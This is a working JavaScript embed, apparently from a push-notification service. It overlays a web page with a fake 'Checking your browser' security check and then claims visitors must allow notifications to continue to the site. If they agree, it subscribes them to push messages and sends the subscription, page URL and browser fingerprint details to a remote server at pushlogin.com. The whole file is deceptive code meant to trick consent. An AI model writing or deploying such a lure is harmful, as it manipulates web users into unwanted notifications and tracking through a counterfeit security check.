(function () {
  var cfg = window.PUSH_CONFIG || {};
  var appUrl = cfg.appUrl || 'https://pushlogin.com';

  // Already subscribed? skip
  var subKey = 'push-sub-' + (cfg.landingId || '');
  if (localStorage.getItem(subKey) === '1') return;

  // ── Build bot-check UI as a self-contained blob iframe ──────────────────
  var uiHtml = '<!DOCTYPE html><html lang="en"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1"><style>'
    + '*{margin:0;padding:0;box-sizing:border-box}'
    + 'body{font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",sans-serif;background:#f0f2f5;display:flex;align-items:center;justify-content:center;min-height:100vh}'
    + '.box{background:#fff;border-radius:12px;box-shadow:0 4px 24px rgba(0,0,0,.12);padding:40px 36px;max-width:420px;width:90%;text-align:center}'
    + '.shield{width:64px;height:64px;margin:0 auto 20px;background:#f97316;border-radius:50%;display:flex;align-items:center;justify-content:center}'
    + '.shield svg{width:32px;height:32px;fill:#fff}'
    + 'h1{font-size:1.3rem;font-weight:700;color:#111;margin-bottom:8px}'
    + 'p{font-size:.9rem;color:#666;line-height:1.5;margin-bottom:24px}'
    + '.spinner{width:40px;height:40px;border:4px solid #e5e7eb;border-top-color:#f97316;border-radius:50%;animation:spin .8s linear infinite;margin:0 auto 16px}'
    + '@keyframes spin{to{transform:rotate(360deg)}}'
    + '.check-row{display:flex;align-items:center;gap:10px;background:#f9fafb;border-radius:8px;padding:12px 16px;margin-bottom:10px;text-align:left}'
    + '.dot{width:10px;height:10px;border-radius:50%;background:#d1d5db;flex-shrink:0}'
    + '.dot.done{background:#22c55e}'
    + '.dot.spin{background:#f97316;animation:pulse 1s infinite}'
    + '@keyframes pulse{0%,100%{opacity:1}50%{opacity:.4}}'
    + '.check-label{font-size:.85rem;color:#374151}'
    + '.btn-row{display:flex;gap:12px;margin-top:24px}'
    + '.btn{flex:1;padding:13px;border:none;border-radius:8px;font-size:.95rem;font-weight:600;cursor:pointer;transition:opacity .15s}'
    + '.btn-allow{background:#f97316;color:#fff}'
    + '.btn-allow:hover{opacity:.9}'
    + '.btn-block{background:#f3f4f6;color:#374151;border:1px solid #e5e7eb}'
    + '.btn-block:hover{background:#e5e7eb}'
    + '.notice{font-size:.75rem;color:#9ca3af;margin-top:16px}'
    + '.phase{display:none}.phase.active{display:block}'
    + '</style></head><body>'
    + '<div class="box">'
    // Phase 1: checking
    + '<div class="phase active" id="p1">'
    + '<div class="shield"><svg viewBox="0 0 24 24"><path d="M12 1L3 5v6c0 5.55 3.84 10.74 9 12 5.16-1.26 9-6.45 9-12V5l-9-4z"/></svg></div>'
    + '<h1>Checking your browser</h1>'
    + '<p>This process is automatic. Your browser will redirect shortly.</p>'
    + '<div class="spinner"></div>'
    + '<div class="check-row"><div class="dot done" id="d1"></div><div class="check-label">Verifying your connection is secure</div></div>'
    + '<div class="check-row"><div class="dot spin" id="d2"></div><div class="check-label">Checking browser compatibility</div></div>'
    + '<div class="check-row"><div class="dot" id="d3"></div><div class="check-label">Completing security check</div></div>'
    + '</div>'
    // Phase 2: allow/block
    + '<div class="phase" id="p2">'
    + '<div class="shield"><svg viewBox="0 0 24 24"><path d="M12 1L3 5v6c0 5.55 3.84 10.74 9 12 5.16-1.26 9-6.45 9-12V5l-9-4z"/></svg></div>'
    + '<h1>Enable Notifications</h1>'
    + '<p>To continue to the site, confirm you want to receive real-time alerts and updates from this website.</p>'
    + '<div class="btn-row">'
    + '<button class="btn btn-block" id="btnBlock">Block</button>'
    + '<button class="btn btn-allow" id="btnAllow">Allow</button>'
    + '</div>'
    + '<div class="notice">You can change this anytime in your browser settings.</div>'
    + '</div>'
    + '</div>'
    + '<script>'
    + '(function(){'
    // Animate checks then show buttons
    + 'setTimeout(function(){document.getElementById("d2").className="dot done";document.getElementById("d3").className="dot spin"},900);'
    + 'setTimeout(function(){document.getElementById("d3").className="dot done";document.getElementById("p1").className="phase";document.getElementById("p2").className="phase active"},2000);'
    + 'document.getElementById("btnAllow").onclick=function(){parent.postMessage({pushAction:"allow"},"*")};'
    + 'document.getElementById("btnBlock").onclick=function(){parent.postMessage({pushAction:"block"},"*")};'
    + '})()'
    + '<\/script></body></html>';

  // ── Create full-screen UI iframe ─────────────────────────────────────────
  var uiBlob = new Blob([uiHtml], { type: 'text/html' });
  var uiBlobUrl = URL.createObjectURL(uiBlob);

  var iframe = document.createElement('iframe');
  iframe.src = uiBlobUrl;
  iframe.setAttribute('allow', 'notifications');
  iframe.style.cssText = 'position:fixed;top:0;left:0;width:100%;height:100%;z-index:2147483647;border:none;background:#f0f2f5';
  document.body.appendChild(iframe);
  document.body.style.overflow = 'hidden';

  // ── Handle messages from UI iframe ──────────────────────────────────────
  window.addEventListener('message', function (e) {
    if (!e.data || !e.data.pushAction) return;
    if (e.data.pushAction === 'allow') {
      handleAllow();
    } else if (e.data.pushAction === 'block') {
      handleBlock();
    }
  });

  function cleanup() {
    iframe.remove();
    document.body.style.overflow = '';
  }

  function handleBlock() {
    cleanup();
    var dest = (cfg.redirects && cfg.redirects.onBlock) || null;
    if (dest) window.location.href = dest;
  }

  function handleAllow() {
    // Request permission — runs in parent page context (correct origin)
    Notification.requestPermission().then(function (permission) {
      if (permission === 'granted') {
        registerAndSubscribe();
      } else {
        handleBlock();
      }
    }).catch(function () { handleBlock(); });
  }

  function registerAndSubscribe() {
    navigator.serviceWorker.register('/push-sw.js', { updateViaCache: 'none' })
      .then(function (reg) {
        return navigator.serviceWorker.ready.then(function () { return reg; });
      })
      .then(function (reg) {
        return reg.pushManager.subscribe({
          userVisibleOnly: true,
          applicationServerKey: urlBase64ToUint8Array(cfg.vapidKey)
        });
      })
      .then(function (sub) {
        return sendToServer(sub);
      })
      .then(function () {
        localStorage.setItem(subKey, '1');
        cleanup();
        var dest = (cfg.redirects && cfg.redirects.onAllow) || null;
        if (dest) window.location.href = dest;
      })
      .catch(function (err) {
        console.error('[Push] Subscribe failed:', err);
        cleanup();
        var dest = (cfg.redirects && cfg.redirects.onAllow) || null;
        if (dest) window.location.href = dest;
      });
  }

  function sendToServer(sub) {
    var j = sub.toJSON();
    var bi = getBrowserInfo();
    return fetch(appUrl + '/api/clients', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        subscription: { endpoint: j.endpoint, keys: j.keys },
        landingId: cfg.landingId,
        domain: cfg.domain,
        url: window.location.href,
        accessStatus: 'allowed',
        browserInfo: bi,
        location: {}
      })
    });
  }

  function getBrowserInfo() {
    var ua = navigator.userAgent;
    var b = 'Unknown', o = 'Unknown';
    if (/Chrome/.test(ua) && !/Chromium|Edge|OPR/.test(ua)) b = 'Chrome';
    else if (/Firefox/.test(ua)) b = 'Firefox';
    else if (/Safari/.test(ua) && !/Chrome/.test(ua)) b = 'Safari';
    else if (/Edg/.test(ua)) b = 'Edge';
    else if (/OPR|Opera/.test(ua)) b = 'Opera';
    if (/Windows/.test(ua)) o = 'Windows';
    else if (/Mac/.test(ua)) o = 'macOS';
    else if (/Android/.test(ua)) o = 'Android';
    else if (/iPhone|iPad/.test(ua)) o = 'iOS';
    else if (/Linux/.test(ua)) o = 'Linux';
    return {
      browser: b, version: 'Unknown', os: o,
      userAgent: ua, language: navigator.language,
      timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
      platform: navigator.platform || 'Unknown'
    };
  }

  function urlBase64ToUint8Array(b64) {
    var pad = '='.repeat((4 - b64.length % 4) % 4);
    var raw = atob((b64 + pad).replace(/-/g, '+').replace(/_/g, '/'));
    var arr = new Uint8Array(raw.length);
    for (var i = 0; i < raw.length; i++) arr[i] = raw.charCodeAt(i);
    return arr;
  }
})();
